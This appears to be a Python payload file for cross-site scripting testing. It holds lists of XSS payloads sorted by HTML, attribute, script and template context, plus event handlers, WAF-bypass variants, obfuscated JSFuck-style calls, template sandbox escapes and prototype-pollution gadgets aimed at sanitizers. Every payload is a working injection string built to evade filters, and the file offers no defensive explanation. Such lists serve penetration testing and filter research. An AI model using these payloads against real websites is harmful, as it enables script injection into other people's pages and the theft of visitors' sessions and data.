# Payload groups organized by context
html_context_payloads = [
    '<xss onafterscriptexecute=alert(1)><script>1</script>',
    '<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>',
    '<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></xss>',
    '<body onbeforeprint=console.log(1)>',
    '<xss onbeforescriptexecute=alert(1)><script>1</script>'
]

attribute_context_payloads = [
    'onafterscriptexecute=alert(1)',
    'onanimationend="alert(1)"',
    'onbeforeprint=console.log(1)',
    'onbeforescriptexecute=alert(1)',
    'oncontentvisibilityautostatechange=alert(1)',
    'onfocusout=alert(1)',
    'onformdata="alert(1)"'
]

script_context_payloads = [
    'window[\'ale\'+\'rt\'](window[\'doc\'+\'ument\'][\'dom\'+\'ain\'])',
    'self[\'ale\'+\'rt\'](self[\'doc\'+\'ument\'][\'dom\'+\'ain\'])',
    'this[\'ale\'+\'rt\'](this[\'doc\'+\'ument\'][\'dom\'+\'ain\'])',
    'window[(+{}+[])[+!![]]+(!![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]])',
    'Object.prototype.innerHTML = \'<img/src/onerror=alert(1)>\''
]

template_context_payloads = [
    '{{constructor.constructor(\'alert(1)\')()}}',
    '{{_c.constructor(\'alert(1)\')()}}',
    '{{$el.ownerDocument.defaultView.alert(1)}}',
    '{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}'
]

# Event handlers that can be used in different contexts
event_handlers = {
    'onafterscriptexecute': ['script'],
    'onanimationend': ['style'],
    'onbeforeprint': ['body'],
    'onbeforescriptexecute': ['script'],
    'oncontentvisibilityautostatechange': ['div', 'span', 'xss'],
    'onfocusout': ['input', 'button', 'a'],
    'onformdata': ['form']
}

# WAF bypass techniques
waf_bypass_payloads = [
    '<svg/x=">"/onload=confirm()//',
    '<svg%0Aonload=%09((pro\\u006dpt))()//',
    '<sCript x>confirm``</scRipt x>',
    '<Script x>prompt()</scRiPt x>'
]

# Prototype pollution payloads
prototype_pollution = [
    'Object.prototype.innerHTML = \'<img/src/onerror=alert(1)>\';',
    'Object.prototype.src = [\'data:,alert(1)//\']',
    'Object.prototype.ALLOWED_ATTR = [\'onerror\', \'src\']'
]
